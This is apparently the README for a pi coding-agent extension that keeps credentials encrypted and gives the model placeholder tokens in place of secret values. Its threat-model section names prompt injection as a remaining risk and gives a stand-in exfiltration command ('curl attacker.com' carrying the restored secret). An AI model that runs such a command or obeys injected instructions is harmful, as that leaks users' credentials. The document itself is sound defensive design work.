# pi-secret-vault

> Encrypted, persistent secrets for pi — the model only ever sees `rsec_<hash8>` tokens.

A [pi](https://github.com/earendil-works/pi-coding-agent) extension that keeps credentials in a local AES-256-GCM library and gives the model a **placeholder surface** instead of values:

```
you:   /vault add openai-key        (masked input — the value never enters the chat)
model: vault_list()                 → openai-key — OpenAI production (llm)
model: vault_get("openai-key")      → rsec_a1b2c3d4  (mounted in this session)
model: bash("curl -H 'Authorization: Bearer rsec_a1b2c3d4' …")
runtime: substitutes the real secret at tool-execution time
```

- **AI read-only**: the model can list aliases and obtain tokens. It cannot add, rotate, remove or reveal — those are human `/vault` commands. No write tool is registered.
- **Input-time capture**: in `vault` landing, values in the prompt are detected and stored in the vault **before** the message is persisted, so even the first paste never lands in the session file in clear.
- **Zero values on the wire**: prompt text, system prompt, session JSONL, tool output and the final provider payload never contain the raw value (landing `vault` is the default). A per-send audit can prove it (`/secret audit on`).
- **Cross-session stability**: a vault token is derived from the alias (`fnv1a("vault:"+alias)`), so after a restart `/vault unlock` + `vault_get` revives the exact same token that earlier turns used.
- **Any tool, any argument**: bash, edit, write, MCP tools — restoration happens in the `tool_call` hook, in place.
- **Session records**: `session-state.json` stores only alias names and is bounded (7-day TTL for pid-less records, max 50). `session_shutdown` clears the mounted list, and the web UI checks the owning PID, so only live sessions that actually hold aliases appear.
- **Weak-password warnings**: `/vault add|set|capture|import` assess the value (dictionary, <8 chars, single character class, low entropy, sequences) and append `⚠ weak password (...)`, `/vault list` + `vault_list` mark weak aliases, `vault_get` adds a rotate suggestion. The pi-web dialog shows a warning banner, a weak-entry count and per-row badges.
- **Weak values are discovered too**: structured extraction (`DB_PASSWORD=…`, JSON/YAML/header/URL), sensitive-file policy (`.env*`, `id_*`, `secret.txt`, …) and a weak-password dictionary after `密码是`/`password is`. `/secret files learn|block|off`, `/secret weak notify|auto|off`, `/secret learn [last|<file>]`.
- **Encrypted at rest** with `~/.pi/agent/secret-vault/master.key` (0600) and atomic 0600 writes; fail-closed when the key does not match.
- **Self-explaining tokens**: a `secret_masking` system-prompt section (shown whenever a token is mounted, or a token shape appears in the transcript) tells the model that a token may also surface in *its own* earlier messages, tool output and file contents — display, never corruption — so it keeps working instead of "repairing" the file. See [Model-side contract](#model-side-contract).

This package is the **superset** of `@aiti-ai/pi-secret-mask` (same engine, shared via `@aiti-ai/secret-mask-core`): all session-level hooks are here too, plus the vault, the two AI tools, `/vault`, and a keyfile-backed store. Both packages can be installed; an events handshake makes the mask yield in the vault's favour in the same session.

## Install

```bash
pi install npm:@aiti-ai/pi-secret-vault@latest
```

or in `~/.pi/agent/settings.json`:

```json
{ "packages": ["npm:@aiti-ai/pi-secret-vault@latest"] }
```

Takes effect in new sessions. Recommended: install **one** of mask/vault globally.

## Commands (human-only writes)

| Command | Effect |
|---|---|
| `/vault add <alias> [desc] [--project] [--tags a,b]` | Masked input; first write auto-creates the vault + keyfile; an existing alias is rotated (version+1). |
| `/vault set <alias>` | Rotate an existing alias (same placeholder, new value). |
| `/vault capture <alias> [--project] -- <command>` | Store the command's stdout (≤4KB, 10s timeout, never echoed). |
| `/vault import <file.env> [--project]` | Import `KEY=value` / `export KEY=value` pairs. |
| `/vault import-env [--project]` | Scan this process environment for secret-named variables. |
| `/vault list [--global|--project]` | Aliases + metadata, zero values. |
| `/vault get <alias>` | Mount an alias and print only its token. |
| `/vault reveal <alias>` | Dialog + clipboard only — never printed into the transcript. |
| `/vault remove <alias>` | Delete (confirmation required); the mounted token is invalidated. |
| `/vault forget` | Unmount all vault aliases for this session (tokens become guarded). |
| `/vault scope` / `mode` / `lock` / `unlock` / `status` | Storage paths, unlock mode (keyfile), lock state, counts. |
| `/secret …` | The whole session-level command surface of pi-secret-mask (landing `plain|vault|ephemeral`, guard, strict, rules, explicit save/load, audit). |

## AI tools

| Tool | Returns |
|---|---|
| `vault_list {tag?}` | Alias, scope, description, tags, version, last use. **No values.** |
| `vault_get {alias}` | The stable token `rsec_<hash8>` + a usage contract ("this token IS a working credential…"), and mounts it in the session registry. Errors are actionable (not initialized / locked / unknown alias). |

There are intentionally **no** `vault_add` / `vault_set` / `vault_reveal` tools: a prompt-injected model must not be able to change or read the library.

## Model-side contract

Whenever a token is mounted — or any token shape shows up in the transcript — the extension injects the
`secret_masking` system-prompt section. Besides "pass the token verbatim", it names the failure modes
that used to make models distrust their own work:

- A token may appear in the model's **own earlier messages and tool-call arguments**, in tool output and
  in file contents it reads. That is the runtime rewriting text on its way into the context; the write
  itself landed with the real value, so a token where plaintext was expected means it worked.
- Tokens are deterministic (same value → same token, across turns and restarts), never randomly
  generated garbage. Do not apologize for one, do not re-read a file to "verify" it, and never rewrite
  the content as "clean text": writing the token again is a no-op, replacing it destroys the value.
- A guard block (`unresolved placeholder`) means the value is not mounted *in this session* — the token
  is still well-formed. Re-mount it with `vault_get` (or ask the user to unlock); never retype, invent
  or substitute a token, and do not "clean" the file because of the block.

The section is keyed (`secret_masking`) and shared with `@aiti-ai/pi-secret-mask`, so only the active
package owns it in a given session.

## Storage & threat model (honest)

```
~/.pi/agent/secret-vault/
  master.key            32 random bytes, 0600
  global.json           entries for every project (metadata plaintext, values AES-256-GCM)
  vault.<cwdHash8>.json project bucket (shadows global aliases)
  session-state.json    zero-value session records (mounted alias names only)
```

**What encryption buys**: the vault file leaving this machine (backups, cloud sync, accidental commit, theft) does not leak values. **What it does not buy**: a same-uid malicious process can read the keyfile — this is the same trust level as `pass`/`keytar`-backed stores. Prompt injection can still exfiltrate through a restored command (`curl attacker.com` with the value): the audit log makes the leak visible, domain/tool policies and an egress proxy are future work (`P2`/`P3` in the design). The **main value is the boundary + the ledger**, not the ciphertext: the value never enters the session file (an infinitely-copied channel), and one controlled reference replaces N scattered plaintext copies.

## Landing policy

Default `vault`: prompt values auto-detected in user text are stored in the encrypted library (alias `auto-<label>-<hash8>`) and replaced by their **stable** token before the message is persisted. `plain` keeps the old behaviour; `ephemeral` keeps values in memory only. Switch with `/secret landing <mode>`.

## Coexistence

- With `@aiti-ai/pi-secret-mask`: same-session handshake, vault wins. A **legacy** mask (≤0.2.3, no handshake) makes the vault yield with a clear notice instead — upgrade mask or uninstall one.
- With `keyshroud` and other redacting extensions: hook chains compose; exact-match replacement sets are disjoint.

## Verification

- `npm test` (this package) drives the full extension through a mock pi host: landing capture → tool mount → tool_call restore → `message_end` redaction → compaction/tree scrubbing → `!` gate → provider rewrite + audit → handshake both ways.
- Core tests live in `@aiti-ai/secret-mask-core` (engine, legacy compatibility) and `@aiti-ai/secret-vault-core` (crypto store, rotation, scopes, fail-closed unlock, tools, commands, landing).

## Design notes

- No passphrase and no `/vault init` ceremony: the first write creates the vault + keyfile; reads on a missing vault return an empty state. (Per-process passphrase prompts were rejected as friction; OS keychain mode is planned.)
- Rotation keeps `createdAt` and increments `version`; `lastUsedAt` / `lastUsedSession` give attribution without storing values.
- Placeholders are stable per alias, so rotation and restart do not break the prompt cache or earlier references.

License: MIT.
